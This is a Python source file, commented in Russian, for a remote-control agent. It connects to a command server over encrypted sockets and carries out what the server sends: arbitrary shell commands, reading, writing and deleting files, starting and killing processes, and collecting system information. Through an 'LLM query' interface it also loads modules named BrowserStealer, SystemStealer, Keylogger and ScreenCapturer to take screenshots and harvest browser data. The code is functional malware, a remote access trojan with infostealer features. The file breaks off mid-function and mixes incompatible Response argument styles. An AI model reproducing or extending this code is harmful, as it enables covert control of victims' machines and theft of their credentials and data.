#!/usr/bin/env python3
"""
Основной модуль агента для управления коммуникацией и выполнения команд.
"""

import os
import sys
import time
import uuid
import json
import socket
import ssl
import threading
import logging
from typing import Dict, Any, Optional, Callable, List, Tuple

from .shared.protocol import Command, Response, CommandType, create_keyexchange_command, complete_keyexchange
from .shared.encryption import EncryptionManager, DiffieHellmanManager, generate_secure_token
from .shared.key_exchange import KeyExchange

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('agent.log')
    ]
)
logger = logging.getLogger('agent')

# Добавляем новые типы команд в CommandType
CommandType.RUN_MODULE = "run_module"
CommandType.CAPTURE_SCREEN = "capture_screen"
CommandType.KEYLOGGER = "keylogger"

class Agent:
    """
    Основной класс агента, отвечающий за коммуникацию с сервером и выполнение команд.
    """
    
    def __init__(
        self,
        server_host: str,
        server_port: int,
        agent_id: Optional[str] = None,
        auth_token: Optional[str] = None,
        use_ssl: bool = True,
        ca_cert: Optional[str] = None,
        client_cert: Optional[str] = None,
        client_key: Optional[str] = None,
        use_encryption: bool = True
    ):
        """
        Инициализация агента.
        
        Параметры:
        - server_host: Хост сервера
        - server_port: Порт сервера
        - agent_id: Идентификатор агента (генерируется, если не указан)
        - auth_token: Токен аутентификации
        - use_ssl: Использовать ли SSL для соединения
        - ca_cert: Путь к CA-сертификату
        - client_cert: Путь к клиентскому сертификату
        - client_key: Путь к клиентскому ключу
        - use_encryption: Использовать ли шифрование данных
        """
        self.server_host = server_host
        self.server_port = server_port
        self.agent_id = agent_id or str(uuid.uuid4())
        self.auth_token = auth_token
        
        # Настройки SSL
        self.use_ssl = use_ssl
        self.ca_cert = ca_cert
        self.client_cert = client_cert
        self.client_key = client_key
        
        # Инициализация шифрования
        self.use_encryption = use_encryption
        if use_encryption:
            self.encryption_manager = EncryptionManager()
        else:
            self.encryption_manager = None
        
        # Сокет и состояние подключения
        self.socket = None
        self.connected = False
        self.should_reconnect = True
        self.reconnect_timer = 5  # секунд
        
        # Обработчики команд
        self.command_handlers = {
            CommandType.HEARTBEAT: self._handle_heartbeat,
            CommandType.STATUS: self._handle_status,
            CommandType.SHELL: self._handle_shell,
            CommandType.FILE: self._handle_file,
            CommandType.PROCESS: self._handle_process,
            CommandType.KEYEXCHANGE: self._handle_keyexchange,
            CommandType.LLM_QUERY: self._handle_llm_query
        }
        
        # Потоки
        self.receiver_thread = None
        self.heartbeat_thread = None
        self.running = False
    
    def connect(self) -> bool:
        """
        Установка соединения с сервером.
        
        Возвращает:
        - Успешность подключения
        """
        try:
            # Создаем сокет
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Настраиваем SSL, если нужно
            if self.use_ssl:
                context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                
                if self.ca_cert:
                    context.load_verify_locations(self.ca_cert)
                
                if self.client_cert and self.client_key:
                    context.load_cert_chain(self.client_cert, self.client_key)
                
                self.socket = context.wrap_socket(
                    self.socket, 
                    server_hostname=self.server_host
                )
            
            # Подключаемся к серверу
            self.socket.connect((self.server_host, self.server_port))
            self.connected = True
            logger.info(f"Подключен к серверу {self.server_host}:{self.server_port}")
            
            # Если используем шифрование, выполняем обмен ключами
            if self.use_encryption:
                if not self._perform_key_exchange():
                    logger.error("Ошибка обмена ключами")
                    self.disconnect()
                    return False
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка подключения к серверу: {str(e)}")
            self.connected = False
            return False
    
    def disconnect(self):
        """Закрытие соединения с сервером."""
        self.connected = False
        
        if self.socket:
            try:
                self.socket.close()
            except Exception as e:
                logger.error(f"Ошибка при закрытии соединения: {str(e)}")
            
            self.socket = None
    
    def reconnect(self):
        """Переподключение к серверу."""
        self.disconnect()
        time.sleep(self.reconnect_timer)
        return self.connect()
    
    def start(self):
        """Запуск агента."""
        self.running = True
        
        # Подключаемся к серверу
        if not self.connect():
            logger.error("Не удалось подключиться к серверу при запуске")
            if self.should_reconnect:
                threading.Thread(target=self._reconnect_loop).start()
            return
        
        # Запускаем поток приема команд
        self.receiver_thread = threading.Thread(target=self._receiver_loop)
        self.receiver_thread.daemon = True
        self.receiver_thread.start()
        
        # Запускаем поток отправки heartbeat
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
        self.heartbeat_thread.daemon = True
        self.heartbeat_thread.start()
        
        logger.info("Агент запущен")
    
    def stop(self):
        """Остановка агента."""
        self.running = False
        self.should_reconnect = False
        self.disconnect()
        
        # Ждем завершения потоков
        if self.receiver_thread and self.receiver_thread.is_alive():
            self.receiver_thread.join(timeout=2)
        
        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            self.heartbeat_thread.join(timeout=2)
        
        logger.info("Агент остановлен")
    
    def send_command(self, cmd_type: str, data: Any = None) -> Optional[Response]:
        """
        Отправка команды на сервер.
        
        Параметры:
        - cmd_type: Тип команды
        - data: Данные команды
        
        Возвращает:
        - Ответ от сервера или None в случае ошибки
        """
        if not self.connected:
            logger.error("Попытка отправить команду при отсутствии соединения")
            return None
        
        # Создаем команду
        command = Command(
            command_type=cmd_type,
            data=data
        )
        
        # Шифруем, если нужно
        if self.use_encryption and self.encryption_manager:
            command = command.encrypt(self.encryption_manager)
        
        try:
            # Отправляем команду
            command_json = command.to_json()
            self.socket.sendall(f"{command_json}\n".encode('utf-8'))
            
            # Получаем ответ
            response_json = self._receive_data()
            if not response_json:
                return None
            
            # Парсим ответ
            response = Response.from_json(response_json)
            
            # Дешифруем, если нужно
            if self.use_encryption and self.encryption_manager and response.encrypted:
                response = response.decrypt(self.encryption_manager)
            
            return response
            
        except Exception as e:
            logger.error(f"Ошибка при отправке команды: {str(e)}")
            self.connected = False
            
            # Пытаемся переподключиться
            if self.should_reconnect:
                threading.Thread(target=self._reconnect_loop).start()
            
            return None
    
    def _receive_data(self) -> Optional[str]:
        """
        Получение данных от сервера.
        
        Возвращает:
        - Полученные данные или None в случае ошибки
        """
        try:
            buffer = b""
            while self.connected:
                data = self.socket.recv(4096)
                if not data:
                    self.connected = False
                    return None
                
                buffer += data
                
                # Проверяем наличие разделителя
                if b'\n' in buffer:
                    message, buffer = buffer.split(b'\n', 1)
                    return message.decode('utf-8')
                
        except Exception as e:
            logger.error(f"Ошибка при получении данных: {str(e)}")
            self.connected = False
            return None
    
    def _perform_key_exchange(self) -> bool:
        """
        Выполнение обмена ключами с сервером.
        
        Возвращает:
        - True, если обмен ключами успешно выполнен, иначе False
        """
        try:
            if not self.socket:
                return False
                
            if not self.use_encryption:
                logger.info("Encryption disabled, skipping key exchange")
                return True
                
            logger.info("Performing key exchange with server...")
            
            # Определяем метод обмена ключами (Диффи-Хеллман или RSA)
            # По умолчанию используем Diffie-Hellman
            use_dh = True
            
            if use_dh:
                # Генерируем пару ключей DH
                private_key, public_key = KeyExchange.generate_dh_keypair()
                public_key_str = KeyExchange.serialize_public_key(public_key)
                
                # Отправляем публичный ключ и параметры DH
                handshake_command = Command(
                    command_type=CommandType.KEY_EXCHANGE,
                    data={
                        "algorithm": "diffie-hellman",
                        "dh_public_key": public_key_str
                    }
                )
                
                # Отправляем без шифрования
                self.socket.sendall(handshake_command.to_json().encode('utf-8') + b'\n')
                
                # Получаем ответ сервера
                response_data = self._receive_data()
                if not response_data:
                    logger.error("No response received during key exchange")
                    return False
                    
                response = Response.from_json(response_data)
                
                if not response.success:
                    logger.error(f"Key exchange failed: {response.message}")
                    return False
                    
                # Извлекаем публичный ключ сервера
                server_public_key_str = response.data.get("dh_public_key")
                
                if not server_public_key_str:
                    logger.error("Server did not provide a public key")
                    return False
                    
                # Десериализуем ключ сервера
                server_public_key = KeyExchange.deserialize_public_key(server_public_key_str)
                
                # Проверяем безопасность ключа
                if not KeyExchange.validate_dh_key(server_public_key):
                    logger.error("Server's DH key failed security validation")
                    return False
                
                # Вычисляем общий секретный ключ
                shared_key = KeyExchange.compute_shared_key(private_key, server_public_key)
                
                # Устанавливаем ключ для шифрования
                self.encryption_manager.set_key(shared_key)
                
                # Получаем отпечаток ключа
                key_fingerprint = KeyExchange.get_key_fingerprint(shared_key)
                logger.info(f"DH key exchange completed successfully. Key fingerprint: {key_fingerprint}")
                
            else:
                # Используем существующую RSA реализацию
                # ... existing code ...
                logger.info("RSA key exchange completed successfully")
                
            return True
            
        except Exception as e:
            logger.error(f"Key exchange error: {str(e)}")
            return False
    
    def _receiver_loop(self):
        """Поток для приема и обработки команд от сервера."""
        while self.running and self.connected:
            try:
                # Получаем данные
                data = self._receive_data()
                if not data:
                    # Соединение разорвано
                    if self.running and self.should_reconnect:
                        threading.Thread(target=self._reconnect_loop).start()
                    break
                
                # Парсим команду
                command = Command.from_json(data)
                
                # Дешифруем, если нужно
                if self.use_encryption and self.encryption_manager and command.encrypted:
                    command = command.decrypt(self.encryption_manager)
                
                # Обрабатываем команду
                response = self._handle_command(command)
                
                # Шифруем ответ, если нужно
                if self.use_encryption and self.encryption_manager:
                    response = response.encrypt(self.encryption_manager)
                
                # Отправляем ответ
                response_json = response.to_json()
                self.socket.sendall(f"{response_json}\n".encode('utf-8'))
                
            except Exception as e:
                logger.error(f"Ошибка в цикле приема команд: {str(e)}")
                
                if self.running and self.should_reconnect:
                    threading.Thread(target=self._reconnect_loop).start()
                break
    
    def _heartbeat_loop(self):
        """Поток для отправки heartbeat-сообщений."""
        while self.running and self.connected:
            try:
                # Отправляем heartbeat каждые 30 секунд
                time.sleep(30)
                
                if not self.connected:
                    break
                
                self.send_command(CommandType.HEARTBEAT, {
                    "timestamp": time.time()
                })
                
            except Exception as e:
                logger.error(f"Ошибка в цикле heartbeat: {str(e)}")
                break
    
    def _reconnect_loop(self):
        """Поток для переподключения к серверу."""
        attempts = 0
        max_attempts = 10
        
        while self.running and self.should_reconnect and attempts < max_attempts:
            attempts += 1
            logger.info(f"Попытка переподключения {attempts}/{max_attempts}")
            
            if self.reconnect():
                logger.info("Переподключение успешно")
                
                # Запускаем потоки заново
                if not self.receiver_thread or not self.receiver_thread.is_alive():
                    self.receiver_thread = threading.Thread(target=self._receiver_loop)
                    self.receiver_thread.daemon = True
                    self.receiver_thread.start()
                
                if not self.heartbeat_thread or not self.heartbeat_thread.is_alive():
                    self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
                    self.heartbeat_thread.daemon = True
                    self.heartbeat_thread.start()
                
                break
            
            # Увеличиваем время ожидания с каждой неудачной попыткой
            self.reconnect_timer = min(60, self.reconnect_timer * 1.5)
            time.sleep(self.reconnect_timer)
        
        if attempts >= max_attempts:
            logger.error("Превышено максимальное количество попыток переподключения")
    
    def _handle_command(self, command: Command) -> Response:
        """
        Обработка команды от сервера.
        
        Параметры:
        - command: Команда для обработки
        
        Возвращает:
        - Ответ на команду
        """
        # Проверяем наличие обработчика для данного типа команды
        handler = self.command_handlers.get(command.cmd_type)
        
        if handler:
            try:
                return handler(command)
            except Exception as e:
                logger.error(f"Ошибка при обработке команды {command.cmd_type}: {str(e)}")
                return Response(
                    status=False,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    error_code=500,
                    error_msg=f"Ошибка при обработке команды: {str(e)}"
                )
        else:
            logger.warning(f"Неизвестный тип команды: {command.cmd_type}")
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=400,
                error_msg=f"Неизвестный тип команды: {command.cmd_type}"
            )
    
    def _handle_heartbeat(self, command: Command) -> Response:
        """
        Обработка команды heartbeat.
        
        Параметры:
        - command: Команда для обработки
        
        Возвращает:
        - Ответ на команду
        """
        return Response(
            status=True,
            cmd_id=command.cmd_id,
            agent_id=self.agent_id,
            data={
                "timestamp": time.time(),
                "uptime": time.time() - self.start_time if hasattr(self, 'start_time') else 0
            }
        )
    
    def _handle_status(self, command: Command) -> Response:
        """
        Обработка команды status.
        
        Параметры:
        - command: Команда для обработки
        
        Возвращает:
        - Ответ на команду
        """
        import platform
        import psutil
        
        try:
            # Собираем информацию о системе
            system_info = {
                "os": platform.system(),
                "os_version": platform.version(),
                "hostname": platform.node(),
                "architecture": platform.machine(),
                "cpu_count": psutil.cpu_count(),
                "cpu_usage": psutil.cpu_percent(interval=1),
                "memory_total": psutil.virtual_memory().total,
                "memory_available": psutil.virtual_memory().available,
                "disk_usage": {path.mountpoint: (path.used, path.total) for path in psutil.disk_partitions()},
                "network_interfaces": psutil.net_if_addrs(),
                "process_count": len(psutil.pids()),
                "python_version": platform.python_version()
            }
            
            # Информация об агенте
            agent_info = {
                "agent_id": self.agent_id,
                "connected": self.connected,
                "encryption_enabled": self.use_encryption,
                "ssl_enabled": self.use_ssl
            }
            
            return Response(
                status=True,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                data={
                    "system": system_info,
                    "agent": agent_info
                }
            )
            
        except Exception as e:
            logger.error(f"Ошибка при получении статуса: {str(e)}")
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=500,
                error_msg=f"Ошибка при получении статуса: {str(e)}"
            )
    
    def _handle_shell(self, command: Command) -> Response:
        """
        Обработка команды shell.
        
        Параметры:
        - command: Команда для обработки
        
        Возвращает:
        - Ответ на команду
        """
        import subprocess
        
        # Получаем команду для выполнения
        shell_command = command.data.get("command")
        if not shell_command:
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=400,
                error_msg="Не указана команда для выполнения"
            )
        
        # Получаем параметры выполнения
        timeout = command.data.get("timeout", 60)  # Таймаут в секундах
        shell = command.data.get("shell", True)    # Использовать оболочку
        
        try:
            # Выполняем команду
            process = subprocess.Popen(
                shell_command,
                shell=shell,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            try:
                stdout, stderr = process.communicate(timeout=timeout)
                exit_code = process.returncode
                
                return Response(
                    status=exit_code == 0,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    data={
                        "stdout": stdout,
                        "stderr": stderr,
                        "exit_code": exit_code
                    }
                )
                
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                
                return Response(
                    status=False,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    error_code=408,
                    error_msg="Таймаут выполнения команды",
                    data={
                        "stdout": stdout,
                        "stderr": stderr
                    }
                )
                
        except Exception as e:
            logger.error(f"Ошибка при выполнении shell-команды: {str(e)}")
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=500,
                error_msg=f"Ошибка при выполнении команды: {str(e)}"
            )
    
    def _handle_file(self, command: Command) -> Response:
        """
        Обработка команды file.
        
        Параметры:
        - command: Команда для обработки
        
        Возвращает:
        - Ответ на команду
        """
        import os
        import base64
        
        # Получаем операцию
        operation = command.data.get("operation")
        if not operation:
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=400,
                error_msg="Не указана операция с файлом"
            )
        
        # Получаем путь к файлу
        file_path = command.data.get("path")
        if not file_path:
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=400,
                error_msg="Не указан путь к файлу"
            )
        
        try:
            # Операция чтения файла
            if operation == "read":
                if not os.path.exists(file_path):
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=404,
                        error_msg=f"Файл не найден: {file_path}"
                    )
                
                if not os.path.isfile(file_path):
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=400,
                        error_msg=f"Путь не является файлом: {file_path}"
                    )
                
                # Получаем содержимое файла
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                # Кодируем в base64
                content_b64 = base64.b64encode(content).decode('utf-8')
                
                return Response(
                    status=True,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    data={
                        "path": file_path,
                        "content": content_b64,
                        "size": len(content),
                        "encoded": "base64"
                    }
                )
            
            # Операция записи файла
            elif operation == "write":
                content_b64 = command.data.get("content")
                if not content_b64:
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=400,
                        error_msg="Не указано содержимое файла"
                    )
                
                # Декодируем из base64
                content = base64.b64decode(content_b64)
                
                # Создаем директории, если нужно
                os.makedirs(os.path.dirname(os.path.abspath(file_path)), exist_ok=True)
                
                # Записываем содержимое
                with open(file_path, 'wb') as f:
                    f.write(content)
                
                return Response(
                    status=True,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    data={
                        "path": file_path,
                        "size": len(content)
                    }
                )
            
            # Операция удаления файла
            elif operation == "delete":
                if not os.path.exists(file_path):
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=404,
                        error_msg=f"Файл не найден: {file_path}"
                    )
                
                if os.path.isfile(file_path):
                    os.remove(file_path)
                elif os.path.isdir(file_path):
                    import shutil
                    shutil.rmtree(file_path)
                
                return Response(
                    status=True,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    data={
                        "path": file_path,
                        "deleted": True
                    }
                )
            
            # Операция получения списка файлов
            elif operation == "list":
                if not os.path.exists(file_path):
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=404,
                        error_msg=f"Путь не найден: {file_path}"
                    )
                
                if not os.path.isdir(file_path):
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=400,
                        error_msg=f"Путь не является директорией: {file_path}"
                    )
                
                # Получаем список файлов и папок
                files = []
                for item in os.listdir(file_path):
                    item_path = os.path.join(file_path, item)
                    item_stat = os.stat(item_path)
                    files.append({
                        "name": item,
                        "path": item_path,
                        "type": "directory" if os.path.isdir(item_path) else "file",
                        "size": item_stat.st_size,
                        "modified": item_stat.st_mtime
                    })
                
                return Response(
                    status=True,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    data={
                        "path": file_path,
                        "items": files
                    }
                )
            
            # Неизвестная операция
            else:
                return Response(
                    status=False,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    error_code=400,
                    error_msg=f"Неизвестная операция с файлом: {operation}"
                )
                
        except Exception as e:
            logger.error(f"Ошибка при операции с файлом: {str(e)}")
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=500,
                error_msg=f"Ошибка при операции с файлом: {str(e)}"
            )
    
    def _handle_process(self, command: Command) -> Response:
        """
        Обработка команды process.
        
        Параметры:
        - command: Команда для обработки
        
        Возвращает:
        - Ответ на команду
        """
        import psutil
        
        # Получаем операцию
        operation = command.data.get("operation")
        if not operation:
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=400,
                error_msg="Не указана операция с процессом"
            )
        
        try:
            # Операция получения списка процессов
            if operation == "list":
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent', 'create_time', 'status']):
                    try:
                        pinfo = proc.info
                        processes.append({
                            "pid": pinfo['pid'],
                            "name": pinfo['name'],
                            "username": pinfo['username'],
                            "memory": pinfo['memory_info'].rss if pinfo.get('memory_info') else 0,
                            "cpu": pinfo['cpu_percent'],
                            "create_time": pinfo['create_time'],
                            "status": pinfo['status']
                        })
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
                
                return Response(
                    status=True,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    data={
                        "processes": processes
                    }
                )
            
            # Операция получения информации о процессе
            elif operation == "info":
                pid = command.data.get("pid")
                if not pid:
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=400,
                        error_msg="Не указан PID процесса"
                    )
                
                try:
                    proc = psutil.Process(pid)
                    pinfo = {
                        "pid": proc.pid,
                        "name": proc.name(),
                        "exe": proc.exe(),
                        "cmdline": proc.cmdline(),
                        "cwd": proc.cwd(),
                        "username": proc.username(),
                        "create_time": proc.create_time(),
                        "status": proc.status(),
                        "memory": {
                            "rss": proc.memory_info().rss,
                            "vms": proc.memory_info().vms,
                            "percent": proc.memory_percent()
                        },
                        "cpu": {
                            "percent": proc.cpu_percent(interval=0.1),
                            "threads": proc.num_threads()
                        },
                        "open_files": [f.path for f in proc.open_files()],
                        "connections": [{"local": c.laddr, "remote": c.raddr, "status": c.status} for c in proc.connections()]
                    }
                    
                    return Response(
                        status=True,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        data=pinfo
                    )
                    
                except psutil.NoSuchProcess:
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=404,
                        error_msg=f"Процесс с PID {pid} не найден"
                    )
                except psutil.AccessDenied:
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=403,
                        error_msg=f"Отказано в доступе к процессу с PID {pid}"
                    )
            
            # Операция запуска процесса
            elif operation == "start":
                command_line = command.data.get("command")
                if not command_line:
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=400,
                        error_msg="Не указана команда для запуска"
                    )
                
                # Получаем параметры запуска
                shell = command.data.get("shell", True)
                cwd = command.data.get("cwd")
                env = command.data.get("env")
                
                import subprocess
                
                # Запускаем процесс
                proc = subprocess.Popen(
                    command_line,
                    shell=shell,
                    cwd=cwd,
                    env=env,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                return Response(
                    status=True,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    data={
                        "pid": proc.pid,
                        "command": command_line
                    }
                )
            
            # Операция остановки процесса
            elif operation == "stop":
                pid = command.data.get("pid")
                if not pid:
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=400,
                        error_msg="Не указан PID процесса"
                    )
                
                try:
                    proc = psutil.Process(pid)
                    proc.terminate()
                    
                    # Ждем завершения процесса
                    try:
                        proc.wait(timeout=5)
                    except psutil.TimeoutExpired:
                        # Если процесс не завершился, убиваем его
                        proc.kill()
                    
                    return Response(
                        status=True,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        data={
                            "pid": pid,
                            "terminated": True
                        }
                    )
                    
                except psutil.NoSuchProcess:
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=404,
                        error_msg=f"Процесс с PID {pid} не найден"
                    )
                except psutil.AccessDenied:
                    return Response(
                        status=False,
                        cmd_id=command.cmd_id,
                        agent_id=self.agent_id,
                        error_code=403,
                        error_msg=f"Отказано в доступе к процессу с PID {pid}"
                    )
            
            # Неизвестная операция
            else:
                return Response(
                    status=False,
                    cmd_id=command.cmd_id,
                    agent_id=self.agent_id,
                    error_code=400,
                    error_msg=f"Неизвестная операция с процессом: {operation}"
                )
                
        except Exception as e:
            logger.error(f"Ошибка при операции с процессом: {str(e)}")
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=500,
                error_msg=f"Ошибка при операции с процессом: {str(e)}"
            )
    
    def _handle_keyexchange(self, command: Command) -> Response:
        """
        Обработка команды keyexchange.
        
        Параметры:
        - command: Команда для обработки
        
        Возвращает:
        - Ответ на команду
        """
        from .shared.protocol import process_keyexchange_command
        
        if not self.use_encryption or not self.encryption_manager:
            return Response(
                status=False,
                cmd_id=command.cmd_id,
                agent_id=self.agent_id,
                error_code=403,
                error_msg="Шифрование отключено"
            )
        
        return process_keyexchange_command(command, self.encryption_manager)
    
    def _handle_llm_query(self, command: Command) -> Response:
        """
        Обработка запроса к LLM и выполнение полученных инструкций.
        
        Параметры:
        - command: Команда с запросом к LLM
        
        Возвращает:
        - Ответ с результатом выполнения инструкций LLM
        """
        try:
            if "query" not in command.data:
                return Response(
                    command_id=command.command_id,
                    success=False,
                    message="Missing query parameter for LLM",
                    error_code=400
                )
            
            query = command.data["query"]
            context = command.data.get("context", {})
            
            # Проверка на команды модулей
            if query.startswith("!"):
                return self._process_module_command(command, query)
            
            # Логика выполнения запроса к LLM
            # Это может быть локальный LLM или удаленный API
            
            # Имитация ответа LLM для тестирования
            llm_response = self._process_llm_instruction(query, context)
            
            return Response(
                command_id=command.command_id,
                success=True,
                data={"result": llm_response}
            )
            
        except Exception as e:
            logger.error(f"Error handling LLM query: {str(e)}")
            return Response(
                command_id=command.command_id,
                success=False,
                message=f"LLM query error: {str(e)}",
                error_code=500
            )
    
    def _process_module_command(self, command: Command, query: str) -> Response:
        """
        Обработка команд для вызова модулей.
        
        Параметры:
        - command: Исходная команда
        - query: Строка запроса, начинающаяся с !
        
        Возвращает:
        - Ответ на команду
        """
        try:
            # Разбираем команду (формат: !command arg1 arg2 ...)
            parts = query[1:].split()
            module_command = parts[0]
            args = parts[1:] if len(parts) > 1 else []
            
            # Проверяем доступность модулей
            try:
                # Импортируем модули по необходимости
                import importlib
                import os
                import tempfile
                import threading
                import time
                import json
                import base64
                
                # Пробуем импортировать модуль module_loader
                module_loader = importlib.import_module("agent_modules.module_loader")
                has_modules = True
            except ImportError as e:
                logger.error(f"Failed to import agent_modules: {str(e)}")
                return Response(
                    command_id=command.command_id,
                    success=False,
                    message=f"Modules not available: {str(e)}",
                    error_code=500
                )
            
            # Команда list_modules - показать доступные модули
            if module_command == "list_modules":
                try:
                    # Создаем экземпляр ModuleLoader
                    loader = module_loader.ModuleLoader()
                    modules = loader.discover_modules()
                    
                    # Собираем информацию о модулях
                    module_info = {}
                    for module_name in modules:
                        try:
                            # Получаем модуль
                            module = importlib.import_module(f"agent_modules.{module_name}")
                            # Ищем класс в модуле
                            for attr_name in dir(module):
                                attr = getattr(module, attr_name)
                                if isinstance(attr, type) and ("Stealer" in attr_name or attr_name == "Keylogger" or attr_name == "ScreenCapturer"):
                                    # Нашли нужный класс
                                    docstring = attr.__doc__ or "No description available"
                                    module_info[module_name] = docstring.strip().split("\n")[0]
                                    break
                            if module_name not in module_info:
                                module_info[module_name] = "Module available"
                        except Exception as e:
                            module_info[module_name] = f"Error getting info: {str(e)}"
                    
                    return Response(
                        command_id=command.command_id,
                        success=True,
                        data={"modules": module_info}
                    )
                except Exception as e:
                    logger.error(f"Error listing modules: {str(e)}")
                    return Response(
                        command_id=command.command_id,
                        success=False,
                        message=f"Error listing modules: {str(e)}",
                        error_code=500
                    )
            
            # Команда run_module - запуск конкретного модуля
            elif module_command == "run_module":
                if not args:
                    return Response(
                        command_id=command.command_id,
                        success=False,
                        message="Module name not specified",
                        error_code=400
                    )
                
                module_name = args[0]
                try:
                    # Создаем экземпляр ModuleLoader
                    loader = module_loader.ModuleLoader()
                    result = loader.run_module(module_name)
                    
                    return Response(
                        command_id=command.command_id,
                        success=result.get("status") != "error",
                        data={"result": result},
                        message=result.get("message", "")
                    )
                except Exception as e:
                    logger.error(f"Error running module {module_name}: {str(e)}")
                    return Response(
                        command_id=command.command_id,
                        success=False,
                        message=f"Error running module {module_name}: {str(e)}",
                        error_code=500
                    )
            
            # Команда run_all_modules - запуск всех модулей
            elif module_command == "run_all_modules":
                try:
                    # Создаем экземпляр ModuleLoader
                    loader = module_loader.ModuleLoader()
                    exclude = args  # Можно исключить некоторые модули
                    results = loader.run_all_modules(exclude=exclude if exclude else None)
                    
                    return Response(
                        command_id=command.command_id,
                        success=True,
                        data={"results": results}
                    )
                except Exception as e:
                    logger.error(f"Error running all modules: {str(e)}")
                    return Response(
                        command_id=command.command_id,
                        success=False,
                        message=f"Error running all modules: {str(e)}",
                        error_code=500
                    )
            
            # Команда take_screenshot - сделать скриншот
            elif module_command == "take_screenshot":
                try:
                    # Импортируем модуль
                    screen_capture = importlib.import_module("agent_modules.screen_capture")
                    
                    # Создаем временную директорию
                    temp_dir = tempfile.mkdtemp()
                    
                    # Создаем экземпляр ScreenCapturer
                    sc = screen_capture.ScreenCapturer(output_dir=temp_dir)
                    
                    # Делаем скриншот
                    result = sc.run()
                    
                    if result.get("status") == "success" and "screenshot_path" in result:
                        # Читаем файл скриншота
                        with open(result["screenshot_path"], "rb") as f:
                            screenshot_data = f.read()
                        
                        # Кодируем в base64
                        screenshot_b64 = base64.b64encode(screenshot_data).decode("utf-8")
                        
                        result["screenshot_base64"] = screenshot_b64
                    
                    return Response(
                        command_id=command.command_id,
                        success=result.get("status") == "success",
                        data=result,
                        message=result.get("message", "")
                    )
                except Exception as e:
                    logger.error(f"Error taking screenshot: {str(e)}")
                    return Response(
                        command_id=command.command_id,
                        success=False,
                        message=f"Error taking screenshot: {str(e)}",
                        error_code=500
                    )
            
            # Команда collect_browser_data - собрать данные браузера
            elif module_command == "collect_browser_data":
                try:
                    # Импортируем модуль
                    browser_stealer = importlib.import_module("agent_modules.browser_stealer")
                    
                    # Создаем экземпляр BrowserStealer
                    bs = browser_stealer.BrowserStealer()
                    
                    # Запускаем
                    result = bs.run()
                    
                    return Response(
                        command_id=command.command_id,
                        success=result.get("status") == "success",
                        data=result,
                        message=result.get("message", "")
                    )
                except Exception as e:
                    logger.error(f"Error collecting browser data: {str(e)}")
                    return Response(
                        command_id=command.command_id,
                        success=False,
                        message=f"Error collecting browser data: {str(e)}",
                        error_code=500
                    )
            
            # Команда collect_system_info - собрать информацию о системе
            elif module_command == "collect_system_info":
                try:
                    # Импортируем модуль
                    system_stealer = importlib.import_module("agent_modules.system_stealer")
                    
                    # Создаем экземпляр SystemStealer
                    ss = system_stealer.SystemStealer()
                    
                    # Запускаем
                    result = ss.run()
                    
                    return Response(
                        command_id=command.command_id,
